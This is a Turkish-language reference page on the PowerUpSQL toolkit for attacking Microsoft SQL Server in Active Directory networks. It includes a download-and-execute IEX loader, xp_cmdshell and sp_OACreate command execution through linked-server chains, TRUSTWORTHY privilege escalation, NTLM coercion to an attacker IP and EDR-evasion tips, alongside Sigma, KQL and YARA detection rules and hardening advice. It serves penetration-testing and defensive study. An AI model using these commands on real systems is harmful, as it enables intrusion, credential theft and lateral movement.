# PowerUpSQL

> **Kategori:** [10. KURUMSAL ALTYAPI, PAYLAŞIM VE VERİ AVI (ENTERPRISE DATA HUNTING)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Active Directory ortamında Service Principal Name (SPN) ve SSRP yayınları üzerinden MSSQL sunucularını keşfeden, zafiyet ve yetki denetimi yapan, Linked Server zincirlerini (dblink) haritalandıran, xp_cmdshell, CLR ve UNC NTLM zorlama tekniklerini destekleyen PowerShell tabanlı veritabanı saldırı ve denetim paketi.

---

## 1. Genel Bakış ve Amaç

PowerUpSQL, Scott Sutherland (@_nullbind / NetSPI) tarafından geliştirilmiş, kurumsal Active Directory ortamlarındaki Microsoft SQL Server altyapılarını keşfetmek, denetlemek, yetki yükseltmek ve yanal hareket gerçekleştirmek için kullanılan kapsamlı bir PowerShell araç setidir.

Active Directory ortamlarında MSSQL sunucuları genellikle kritik iş uygulamalarını, finansal kayıtları, ERP/CRM verilerini ve kimlik doğrulama veritabanlarını barındırır. Ayrıca SQL servis hesapları çoğunlukla yüksek yetkili etki alanı hesapları (Domain Admins veya özel servis hesapları) ile çalıştırılır. PowerUpSQL, herhangi bir ağ port taraması yapmadan, yalnızca etki alanı denetleyicisine gönderilen LDAP SPN (`MSSQLSvc/*`) sorguları ile tüm SQL örneklerini (instances) saniyeler içinde sessizce keşfedebilir.

Aracın en kritik yeteneklerinden biri, bağlı sunucular (Linked Servers) arasındaki güven ilişkilerini özyinelemeli (recursive) olarak tarayarak `sysadmin` yetkisine giden zincirleme atlama yollarını (`OPENQUERY`) tespit edebilmesidir.

```
+-------------------------------------------------------------------------+
|                        PowerUpSQL Mimari Akışı                          |
+-------------------------------------------------------------------------+
                               |
               1. SPN Discovery via LDAP (TCP 389)
                [servicePrincipalName=MSSQLSvc/*]
                               v
                +------------------------------+
                | Active Directory DC          |
                +------------------------------+
                               | SQL Örnekleri (Host:Port / Instance)
                               v
                     +--------------------+
                     | PowerUpSQL Engine  |
                     +--------------------+
                               |
               2. TDS Protocol (TCP 1433 / Dynamic)
               (Kerberos / NTLM / SQL Auth)
                               v
                +------------------------------+
                | SQL Server 01 (Public Rolü)  |
                +------------------------------+
                               |
               3. Linked Server Crawl (dblink)
               OPENQUERY('SQL02', 'SELECT ...')
                               v
                +------------------------------+
                | SQL Server 02 (SA / sysadmin)|
                +------------------------------+
                               |
          +--------------------+--------------------+
          |                                         |
 4a. xp_cmdshell / CLR Execution            4b. xp_dirtree UNC Coercion
 (İşletim Sistemi Komutu / Kod)             (\\Attacker\share -> NTLM Relay)
          |                                         |
          v                                         v
   +---------------+                         +---------------+
   | SYSTEM / Host |                         | NTLM Relay /  |
   | Access        |                         | Hash Capture  |
   +---------------+                         +---------------+
```

### 1.1 SQL Server Keşif Yöntemleri ve Protokolleri
PowerUpSQL hedef ortamda SQL sunucularını bulmak için birden fazla yöntem kullanır:
* **LDAP SPN Keşfi (`Get-SQLInstanceDomain`):** Active Directory veritabanında `MSSQLSvc/<FQDN>:<Port>` şeklinde kayıtlı SPN'leri listeler. Tamamen sessizdir, hedef SQL sunucusuna tek bir paket bile göndermez.
* **SSRP (SQL Server Resolution Protocol - UDP 1434):** Dinamik port kullanan adlandırılmış SQL örneklerinin (named instances) gerçek dinleme portunu öğrenmek için SQL Browser servisine sorgu atar.
* **Ağ Taraması (TCP 1433):** Belirli alt ağlarda doğrudan Tabular Data Stream (TDS) portunu yoklar.
* **Yerel Kayıt Defteri ve WMI (`Get-SQLInstanceLocal`):** Yerel sistemde kurulu SQL servislerini sorgular.

### 1.2 Kod Yürütme ve Yetki Yükseltme Vektörleri (Execution & Escalation Mechanics)
PowerUpSQL, veritabanı düzeyinden işletim sistemi düzeyine geçişte ve yetki yükseltmede dört ana teknik mekanizmayı destekler:
* **Genişletilmiş Saklı Yordamlar (`xp_cmdshell`):** `sysadmin` yetkisiyle `cmd.exe` süreçleri türetilerek işletim sistemi komutu çalıştırılır. EDR'lar tarafından en sık izlenen vektördür.
* **OLE Automation (`sp_OACreate` / `sp_OAMethod`):** `wscript.shell` COM nesnesi türeterek arka planda sessiz komut yürütülmesini sağlar; `xp_cmdshell` devre dışı bırakılmış sistemlerde güçlü bir alternatiftir.
* **SQL CLR Derleme Enjeksiyonu (`CREATE ASSEMBLY`):** Veritabanı üzerinde `clr enabled` ve `clr strict security = 0` (veya imzalı sertifika) yapılandırılarak belleğe saf C# derlemesi yüklenir ve doğrudan unmanaged/managed kod koşturulur.
* **TRUSTWORTHY ve Impersonation Sıçraması:** Sahibi `sa` olan bir veritabanında `TRUSTWORTHY` bayrağı aktifse, o veritabanında `db_owner` olan standart bir kullanıcı `EXECUTE AS OWNER` diyerek anında tüm sunucuda `sysadmin` yetkisini gasp edebilir.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Sessiz SQL Keşfi** | Port taraması yapmadan LDAP SPN sorgusuyla yüzlerce kurumsal SQL sunucusunun haritasını çıkarma. |
| **Linked Server Atlama (dblink)** | Düşük yetkili (`public`) erişimden başlayarak bağlı sunucu zinciri üzerinden merkezi DB'de `sysadmin` olma. |
| **NTLM Hash Yakalama / Zorlama** | `xp_dirtree` veya `xp_fileexist` ile hedef SQL sunucusunun servis hesabını saldırganın makinesine NTLM kimlik doğrulamasına zorlama. |
| **Veritabanı Güvenlik Zafiyeti Taraması** | Zayıf parolalar, `TRUSTWORTHY` veritabanları, CLR etkinliği ve aşırı yetkili kullanıcıların otomatik denetimi. |
| **Doğrudan Komut Yürütme** | `sysadmin` yetkisine ulaşıldığında `xp_cmdshell` veya CLR enjeksiyonu ile işletim sistemi kabuğu alma. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | PowerUpSQL | impacket-mssqlclient | HeidiSQL / DBeaver | Metasploit (mssql_*) |
|---|---|---|---|---|
| **Geliştirme Dili** | PowerShell (.NET SqlClient) | Python | C++ / Java (GUI) | Ruby |
| **AD SPN Entegrasyonu** | Mükemmel (Dahili LDAP) | Manuel SPN arama gerekir | Yok | Harici modül |
| **Linked Server Crawl** | Tam Otomatik ve Özyinelemeli | Manuel sorgu | Manuel SQL sorgusu | Temel |
| **TDS Protokol Esnekliği** | Yüksek (Kerberos/Windows Auth) | Yüksek (Kerberos/NTLM/Pass-the-Hash)| Standart Auth | Standart Auth |
| **Zafiyet Denetim Motoru** | Kapsamlı (`Invoke-SQLAudit`) | Yok (Sadece Client) | Yok | Sınırlı exploitler |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

PowerUpSQL bir PowerShell betik modülü (`PowerUpSQL.ps1`) olarak belleğe aktarılır (`Import-Module` veya `IEX`).

### Modülün Yüklenmesi
```powershell
Import-Module .\PowerUpSQL.ps1
# veya C2 bellek içi yükleme:
IEX(New-Object System.Net.WebClient).DownloadString('http://10.0.0.5/PowerUpSQL.ps1')
```

### Kritik Cmdlet ve Parametreler Tablosu

| Cmdlet | Parametre | Açıklama | Örnek Değer |
|---|---|---|---|
| `Get-SQLInstanceDomain` | `-Domain` | Etki alanındaki tüm SQL SPN'lerini LDAP ile sorgular. | `Get-SQLInstanceDomain` |
| `Get-SQLConnectionTest` | `-Instance` | Belirtilen SQL örneğine TDS bağlantısı kurup erişimi test eder. | `-Instance "SQL01.corp.local,1433"` |
| `Get-SQLServerInfo` | `-Instance` | SQL Server sürümü, işletim sistemi, servis hesabı ve yetkileri dökümler. | `-Instance "SQL01\DEV"` |
| `Get-SQLServerLinkCrawl` | `-Instance` | Bağlı sunucuları (Linked Servers) özyinelemeli olarak tarar ve zincir haritası çıkarır. | `-Instance "SQL01"` |
| `Invoke-SQLAudit` | `-Instance` | SQL örneğindeki tüm bilinen zafiyet ve yapılandırma hatalarını denetler. | `Invoke-SQLAudit -Instance "SQL01"` |
| `Invoke-SQLOSCmd` | `-Command` | `xp_cmdshell` etkinleştirerek işletim sistemi komutu yürütür. | `-Command "whoami /all"` |
| `Get-SQLQuery` | `-Query` | Hedef SQL sunucusunda doğrudan T-SQL sorgusu yürütür. | `-Query "SELECT @@version"` |
| `Invoke-SQLUncPathInjection` | `-CaptureIp` | `xp_dirtree` tetikleyerek SQL servis hesabını SMB üzerinden NTLM relay'e zorlar. | `-CaptureIp 10.0.0.5` |
| `Invoke-SQLAuditPrivilege` | `-Instance` | `sysadmin` ve sunucu düzeyindeki kritik rolleri denetler. | `-Instance "SQL01"` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Etki Alanındaki Tüm SQL Sunucularının Sessizce Keşfedilmesi
Active Directory denetleyicisine LDAP sorgusu gönderilerek etki alanındaki tüm kayıtlı SQL servis hesaplarının ve sunucularının listelenmesi.

```powershell
Get-SQLInstanceDomain | Format-Table ComputerName, Instance, Port, ServiceAccount -AutoSize
```

**Örnek Konsol Çıktısı:**
```text
ComputerName       Instance                  Port ServiceAccount
------------       --------                  ---- --------------
DC01.corp.local    DC01.corp.local,1433      1433 CORP\SQLService_DC
SQL01.corp.local   SQL01.corp.local\PROD     1433 CORP\svc_sqlprod
ERP01.corp.local   ERP01.corp.local\NAV      51421 CORP\sql_nav
CRM-DB.corp.local  CRM-DB.corp.local,1433    1433 CORP\sql_crm
```

### Senaryo 2: Bağlı Sunucu Zincirlerinin (Linked Servers) Taranması ve sysadmin Tespiti
Düşük yetkili erişim sağlanan bir başlangıç SQL sunucusundan (`SQL01`), bağlı diğer tüm sunucuların taranarak zincir sonundaki yetkilerin dökülmesi.

```powershell
Get-SQLServerLinkCrawl -Instance "SQL01.corp.local" -Verbose
```

**Örnek Konsol Çıktısı:**
```text
VERBOSE: Crawling links from SQL01.corp.local...
VERBOSE: Found link: SQL01 -> SQL02.corp.local (User: sa, IsSysadmin: 1)
VERBOSE: Found link: SQL02 -> SQL03.corp.local (User: sa, IsSysadmin: 1)
[+] Link Chain Discovered:
    Path: SQL01 -> SQL02 -> SQL03
    Final Server: SQL03.corp.local
    Effective User: sa
    IsSysadmin: True
[+] Execution string for final hop:
    SELECT * FROM OPENQUERY("SQL02", 'SELECT * FROM OPENQUERY("SQL03", ''SELECT @@servername, system_user, IS_SRVROLEMEMBER(''''sysadmin'''')'')')
```

### Senaryo 3: Linked Server Üzerinden Komut Yürütme (xp_cmdshell Chain)
Zincirleme bağlı sunucu üzerinden en uçtaki sunucuda `xp_cmdshell` açarak işletim sistemi komutu çalıştırma.

```powershell
Get-SQLServerLinkCrawl -Instance "SQL01.corp.local" -Query "exec master..xp_cmdshell 'whoami'"
```

### Senaryo 4: SQL Servis Hesabını NTLM Yakalamaya Zorlama (xp_dirtree UNC Coercion)
Hedef SQL sunucusunda `xp_dirtree` çalıştırarak saldırganın dinleyici makinesine (`10.0.0.5`) SMB bağlantısı tetikleme.

```powershell
Invoke-SQLUncPathInjection -Instance "SQL01.corp.local" -CaptureIp "10.0.0.5"
```

### Senaryo 5: Kapsamlı Güvenlik Denetimi Raporu (Invoke-SQLAudit)
Tek bir komutla hedef sunucunun şifreleme, varsayılan parolalar, `TRUSTWORTHY` veritabanları ve yetki durumunu HTML formatında raporlama.

```powershell
Invoke-SQLAudit -Instance "SQL01.corp.local" -HtmlReport -ReportFile "C:\Temp\SQL_Audit_Report.html"
```

### Senaryo 6: TRUSTWORTHY ve Impersonation ile sysadmin Yetkisine Yükselme
Veritabanı sahibi `sa` olan ancak `TRUSTWORTHY` bayrağı açık bırakılmış bir ikincil veritabanı üzerinden `sysadmin` yetkisine sıçrama.

```powershell
Invoke-SQLAuditPrivilege -Instance "SQL01.corp.local" -Database "InsecureDB"
```

### Senaryo 7: OLE Automation (sp_OACreate) ile xp_cmdshell Olmadan Komut Yürütme
`xp_cmdshell` prosedürünün katı EDR kurallarıyla izlendiği veya şirket politikası gereği tamamen silindiği ortamlarda WScript.Shell COM nesnesi üzerinden komut yürütme.

```powershell
Get-SQLQuery -Instance "SQL01.corp.local" -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_OACreate 'wscript.shell', @myshell OUT; EXEC sp_OAMethod @myshell, 'run', null, 'cmd.exe /c whoami > C:\Temp\out.txt';"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Cannot connect to SQL Server: A network-related or instance-specific error occurred.` | Hedef SQL sunucusu TCP 1433 portunu dinlemiyor, dinamik port kullanıyor veya güvenlik duvarı engelliyor. | `Get-SQLInstanceDomain` çıktısındaki port bilgisini kontrol edin; `SQL01,51421` şeklinde portu virgülle belirtin. |
| `Login failed for user 'CORP\User'. Reason: The account is disabled.` | Active Directory kullanıcısı devre dışı bırakılmış veya SQL Server üzerinde oturum açma (Logon) izni yok. | `Get-SQLConnectionTest` ile farklı bir etki alanı hesabı veya SQL yerel kimlik bilgisi (`-Username sa -Password ...`) deneyin. |
| `SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell'.` | `xp_cmdshell` güvenlik ilkesi gereği kapalı (`surface area configuration`). | `sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;` çalıştırarak açın (sysadmin gerekir). |
| `Access to the remote server is denied because the current security context is not trusted.` | Bağlı sunucu (Linked Server) RPC/RPC Out yapılandırmasında geçerli kimlik bağlamı reddedildi. | Linked Server özelliklerinde "Be made using the login's current security context" yerine uzak kullanıcı tanımlı mapping arayın. |
| `The EXECUTE permission was denied on the object 'xp_dirtree'.` | Hedef SQL Server sürümünde `xp_dirtree` genişletilmiş saklı yordamı standart kullanıcılar için kısıtlanmış. | `xp_fileexist` alternatifini deneyin veya `sysadmin` yetkisi elde edildikten sonra çalıştırın. |
| `SSRP query failed for named instance.` | SQL Server Browser servisi (UDP 1434) kapalı veya ağ cihazları UDP trafiğini filtreliyor. | Doğrudan SQL servisinin dinlediği TCP portunu Nmap/Test-NetConnection ile tespit edip bağlanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

PowerUpSQL'in etki alanı keşif aşaması (`Get-SQLInstanceDomain`) yalnızca LDAP okuma sorgusu ürettiği için son derece sessizdir. Ancak doğrudan SQL sunucusuna bağlanıldığında, TDS paketleri, SQL Server hata günlükleri (ERRORLOG) ve Windows Olay Günlükleri üzerinde belirgin izler bırakır.

```
[PowerUpSQL Yürütmesi]
          │
          ├──> LDAP SPN Keşfi (MSSQLSvc/*) ─────> Event ID 1644 (Tamamen Sessiz)
          │
          ├──> TDS Bağlantısı (TCP 1433) ────────> SQL Server Errorlog (Login Success/Fail)
          │                                       Windows Event ID 18456 (Login Failed)
          │
          ├──> xp_cmdshell Etkinleştirme ────────> SQL Profiler / Extended Events
          │                                       Event ID 15457 (Configuration Option Changed)
          │
          └──> Komut Yürütme (cmd.exe) ──────────> Sysmon Event ID 1 (sqlservr.exe -> cmd.exe)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **Windows Security Event ID 18456:** SQL Server kimlik doğrulama başarısızlıkları (`Reason: Token-based server access validation failed`).
* **Windows Security Event ID 15457:** SQL Server konfigürasyon değişikliği (`Configuration option 'xp_cmdshell' changed from 0 to 1`).
* **Sysmon Event ID 1 (Process Creation):** `sqlservr.exe` sürecinin alt süreç olarak `cmd.exe` veya `powershell.exe` başlatması en kritik EDR tespit kuralıdır.
* **SQL Server ERRORLOG Dosyası:** Başarılı ve başarısız tüm oturum açma denemeleri kaynak IP ve istemci adıyla kaydedilir.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Discovery** | [T1135](https://attack.mitre.org/techniques/T1135/) | Network Share Discovery | SPN ve SSRP üzerinden veritabanı altyapısının keşfi. |
| **Credential Access** | [T1187](https://attack.mitre.org/techniques/T1187/) | Forced Authentication | `xp_dirtree` ile SQL servis hesabının NTLM hash'inin çekilmesi. |
| **Execution** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | PowerShell | PowerUpSQL modülünün yürütülmesi. |
| **Execution** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell | `xp_cmdshell` ile işletim sistemi komutlarının çalıştırılması. |
| **Lateral Movement** | [T1210](https://attack.mitre.org/techniques/T1210/) | Exploitation of Remote Services | Linked Server zincirleri (dblink) üzerinden sunucular arası atlama. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **xp_cmdshell Süreç Ağacı Alarmı** | `sqlservr.exe` sürecinin `cmd.exe` türetmesi EDR/SIEM kurallarında doğrudan kritik alarm üretir. | Komut yürütmek yerine doğrudan T-SQL sorguları veya SQL CLR derlemeleri (bellek içi) kullanın; işlem bitince `xp_cmdshell`'i kapatın. |
| **SQL Konfigürasyon Logu** | `sp_configure` çağrılarının Event ID 15457 üretmesi. | Eğer hedefte Linked Server üzerinden sadece veri okunacaksa konfigürasyon değiştirmeyin. |
| **Aşırı Bağlantı Denemesi** | `Invoke-SQLAudit`'in yüzlerce tablo ve ayar için peş peşe sorgu göndermesi. | Kapsamlı denetim yerine hedeflenen tekil sorguları (`Get-SQLQuery`) tercih edin. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (MSSQL xp_cmdshell Execution via sqlservr.exe)
```yaml
title: Suspicious Process Spawning from SQL Server (xp_cmdshell)
id: f1a2b3c4-9876-5432-10fe-dcba98765432
status: production
description: MSSQL servis süreci (sqlservr.exe) tarafından başlatılan komut satırı veya PowerShell süreçleri tespit edildi.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    ParentImage|endswith: '\sqlservr.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\whoami.exe'
  condition: selection
falsepositives:
  - Özel yapılandırılmış eski veritabanı bakım betikleri
level: critical
```

#### Microsoft Sentinel KQL Sorgusu
```kql
SecurityEvent
| where EventID == 15457 or EventID == 18456
| extend ConfigMessage = tostring(EventData)
| where ConfigMessage has "xp_cmdshell" or ConfigMessage has "show advanced options"
| project TimeGenerated, Computer, Activity, SubjectUserName, ConfigMessage
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule PowerUpSQL_Script_Detection {
    meta:
        description = "PowerUpSQL PowerShell modülü statik analizi ve tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/NetSPI/PowerUpSQL"
    strings:
        $s1 = "PowerUpSQL" ascii wide nocase
        $s2 = "Get-SQLInstanceDomain" ascii wide
        $s3 = "Get-SQLServerLinkCrawl" ascii wide
        $s4 = "Invoke-SQLUncPathInjection" ascii wide
        $s5 = "Invoke-SQLAudit" ascii wide
    condition:
        2 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **xp_cmdshell ve OLE Automation Kısıtlaması:** `xp_cmdshell` ve `sp_OACreate` yordamları varsayılan olarak devre dışı bırakılmalı, servis hesaplarının bu ayarları açma yetkisi sınırlandırılmalıdır.
* **Linked Server İzin Hijyeni:** Bağlı sunucu tanımlamalarında `sa` veya sabit yüksek yetkili hesaplar yerine en az yetkili özel hesaplar eşleştirilmeli (`RPC Out` gereksizse kapatılmalıdır).
* **Servis Hesabı İzolasyonu:** SQL Server asla `Domain Admins` veya `Local System` yetkisiyle çalıştırılmamalı; Group Managed Service Account (gMSA) kullanılmalıdır.
* **Genişletilmiş Saklı Yordam Yetkileri:** `xp_dirtree`, `xp_fileexist` gibi NTLM coercion saldırılarına zemin hazırlayan yordamlar `public` rolünden alınmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```powershell
# 1. Etki Alanındaki Tüm SQL Sunucularını SPN ile Keşfetme
Get-SQLInstanceDomain

# 2. Keşfedilen SQL Sunucularına Bağlantı Testi Yapma
Get-SQLInstanceDomain | Get-SQLConnectionTest

# 3. Bağlı Sunucu Zincirlerini (Linked Server Crawl) Haritalama
Get-SQLServerLinkCrawl -Instance "SQL01.corp.local"

# 4. Linked Server Zinciri Üzerinden Uzak Sistemde Komut Yürütme
Get-SQLServerLinkCrawl -Instance "SQL01.corp.local" -Query "exec master..xp_cmdshell 'whoami'"

# 5. SQL Servis Hesabını NTLM Relay Dinleyicisine Yönlendirme (UNC Coercion)
Invoke-SQLUncPathInjection -Instance "SQL01.corp.local" -CaptureIp "10.0.0.5"

# 6. Doğrudan T-SQL Sorgusu Çalıştırma
Get-SQLQuery -Instance "SQL01.corp.local" -Query "SELECT @@servername, system_user"

# 7. Hedef Sunucuda xp_cmdshell ile İşletim Sistemi Komutu Çalıştırma
Invoke-SQLOSCmd -Instance "SQL01.corp.local" -Command "whoami /all"

# 8. SQL Sunucusunda Kapsamlı Zafiyet ve Yapılandırma Denetimi
Invoke-SQLAudit -Instance "SQL01.corp.local" -Verbose

# 9. TRUSTWORTHY Zafiyeti Bulunan Veritabanlarını Denetleme
Invoke-SQLAuditPrivilege -Instance "SQL01.corp.local"

# 10. Yerel Makinedeki SQL Örneklerini Keşfetme
Get-SQLInstanceLocal
```

### Komut Detay Analizleri

#### 1. Etki Alanındaki Tüm SQL Sunucularını SPN ile Keşfetme
* **Ne Yapar?:** Active Directory veritabanına bağlanır ve `MSSQLSvc/*` özniteliğine sahip tüm servis hesaplarını ve portlarını listeler.
* **Ne Zaman Kullanılır?:** Operasyonun ilk keşif aşamasında hedef ağdaki tüm SQL sunucularını sessizce tespit etmek için.
* **Parametreler:**
  * Parametresiz çalıştırıldığında mevcut kullanıcının oturum açtığı etki alanını otomatik sorgular.

#### 2. Keşfedilen SQL Sunucularına Bağlantı Testi Yapma
* **Ne Yapar?:** SPN ile bulunan tüm sunuculara mevcut Windows kimlik bilgisiyle TDS bağlantısı açmayı dener ve erişim durumunu listeler.
* **Ne Zaman Kullanılır?:** Hangi SQL sunucularında geçerli kullanıcının oturum açma yetkisi olduğunu hızlıca belirlemek için.
* **Parametreler:**
  * Pipeline (`|`) ile SPN nesnelerini doğrudan `Get-SQLConnectionTest` cmdlet'ine aktarır.

#### 3. Bağlı Sunucu Zincirlerini (Linked Server Crawl) Haritalama
* **Ne Yapar?:** Belirtilen SQL sunucusuna bağlanır, `sys.servers` tablosunu okur, bağlı sunuculara zıplar ve özyinelemeli olarak `sysadmin` yetkisine ulaşan zincirleri çıkarır.
* **Ne Zaman Kullanılır?:** Düşük yetkili bir SQL erişiminden merkezi üretim veritabanlarına yetki yükseltme yolu ararken.
* **Parametreler:**
  * `-Instance "SQL01.corp.local"`: Başlangıç SQL sunucusu FQDN veya IP adresi.

#### 4. Linked Server Zinciri Üzerinden Uzak Sistemde Komut Yürütme
* **Ne Yapar?:** Bulunan bağlı sunucu zinciri üzerinden iç içe geçmiş `OPENQUERY` çağrılarıyla hedef uç makinede komut yürütür.
* **Ne Zaman Kullanılır?:** Doğrudan erişilemeyen iç ağdaki bir SQL sunucusunda yanal hareket gerçekleştirmek için.
* **Parametreler:**
  * `-Query "..."`: Zincir sonundaki sunucuda yürütülecek T-SQL veya xp_cmdshell komutu.

#### 5. SQL Servis Hesabını NTLM Relay Dinleyicisine Yönlendirme (UNC Coercion)
* **Ne Yapar?:** SQL Server'ın `xp_dirtree` yordamını kullanarak saldırganın IP adresine SMB bağlantısı tetikler; servis hesabının NetNTLMv2 özetini yakalar.
* **Ne Zaman Kullanılır?:** SQL servis hesabı yüksek yetkili olduğunda hash yakalamak veya AD CS / LDAP'a NTLM relay yapmak için.
* **Parametreler:**
  * `-CaptureIp "10.0.0.5"`: NTLM hash'lerinin yakalanacağı dinleyici IP adresi.

#### 6. Doğrudan T-SQL Sorgusu Çalıştırma
* **Ne Yapar?:** Belirtilen hedef sunucuda özel SQL sorgusu çalıştırarak dönen tabloyu PowerShell nesnesi olarak sunar.
* **Ne Zaman Kullanılır?:** Veritabanı tablolarını listelemek, kullanıcı rollerini incelemek veya hassas verileri çekmek için.
* **Parametreler:**
  * `-Query "..."`: Çalıştırılacak T-SQL sorgu ifadesi.

#### 7. Hedef Sunucuda xp_cmdshell ile İşletim Sistemi Komutu Çalıştırma
* **Ne Yapar?:** Sunucuda `xp_cmdshell` bileşenini etkinleştirir, verilen komutu yürütür, çıktısını ekrana basar ve tercihe göre bileşeni kapatır.
* **Ne Zaman Kullanılır?:** `sysadmin` yetkisi elde edildikten sonra sunucu üzerinde işletim sistemi düzeyinde komut çalıştırmak için.
* **Parametreler:**
  * `-Command "whoami /all"`: İşletim sistemi kabuğunda yürütülecek komut.

#### 8. SQL Sunucusunda Kapsamlı Zafiyet ve Yapılandırma Denetimi
* **Ne Yapar?:** Parola politikaları, şifreleme durumu, açık saklı yordamlar ve bilinen zafiyetleri denetleyen onlarca testi peş peşe çalıştırır.
* **Ne Zaman Kullanılır?:** Sızma testi veya güvenlik değerlendirme raporu hazırlarken zafiyet tespiti için.
* **Parametreler:**
  * `-Verbose`: Denetim adımlarını ayrıntılı olarak konsola yansıtır.

#### 9. TRUSTWORTHY Zafiyeti Bulunan Veritabanlarını Denetleme
* **Ne Yapar?:** `is_trustworthy_on = 1` olan ve veritabanı sahibi `sysadmin` rolüne sahip veritabanlarını listeler.
* **Ne Zaman Kullanılır?:** Düşük yetkili veritabanı kullanıcısından sunucu düzeyinde `sysadmin` yetkisine zıplamak için.
* **Parametreler:**
  * `-Instance "SQL01.corp.local"`: Hedef veritabanı örneği.

#### 10. Yerel Makinedeki SQL Örneklerini Keşfetme
* **Ne Yapar?:** Yerel sistem kayıt defterini ve Windows servislerini tarayarak makinede yüklü tüm SQL örneklerini listeler.
* **Ne Zaman Kullanılır?:** Ele geçirilen bir sunucu üzerinde yerel veritabanı servislerini keşfetmek için.
* **Parametreler:**
  * Parametresiz çalışır.

---

## Kaynaklar
* [PowerUpSQL Resmi GitHub Deposu](https://github.com/NetSPI/PowerUpSQL)
* [NetSPI Blog: Attacking SQL Server Linked Servers](https://www.netspi.com/blog/technical/network-penetration-testing/attacking-sql-server-linked-servers/)
* [Microsoft Dokümantasyonu: xp_cmdshell Sunucu Yapılandırma Seçeneği](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)

---

> **Önceki:** [← SharpShares](./SharpShares.md) · **Sonraki:** [impacket-mssqlclient →](./impacket-mssqlclient.md)
